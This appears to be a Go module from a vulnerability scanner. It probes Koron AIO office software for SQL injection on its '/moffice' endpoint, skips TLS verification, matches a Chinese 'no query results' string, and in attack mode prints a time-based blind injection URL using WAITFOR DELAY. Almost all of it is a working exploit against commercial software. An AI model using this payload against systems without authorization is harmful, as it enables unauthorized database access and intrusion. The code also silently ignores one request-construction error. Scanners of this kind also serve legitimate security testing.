package CVEs

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func KoronAIO_SQLInjection(url string, Attack bool) error {
	url1 := fmt.Sprintf("%s/moffice?op=showWorkPlan&planId=1%%27;ycx--&sid=1", url)
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{
		Transport: tr,
		Timeout:   10 * time.Second, // 设置超时时间为 10 秒
	}

	request, err := http.NewRequest("GET", url1, nil)
	if err != nil {
	}

	response, err := client.Do(request)
	if err != nil {
		return err
	}

	body, err := ioutil.ReadAll(response.Body)
	if err != nil {
		return err
	}
	if strings.Contains(string(body), "无查询结果") {
		fmt.Println("[*]科荣AIO_SQLInjection : " + url)
		if Attack {
			fmt.Println(fmt.Sprintf("Attack-Result : %s/moffice?op=showWorkPlan&planId=1%%27;WAITFOR+DELAY+%%270:0:5%%27--&sid=1\n", url))
		}
	}
	defer response.Body.Close()

	return nil
}
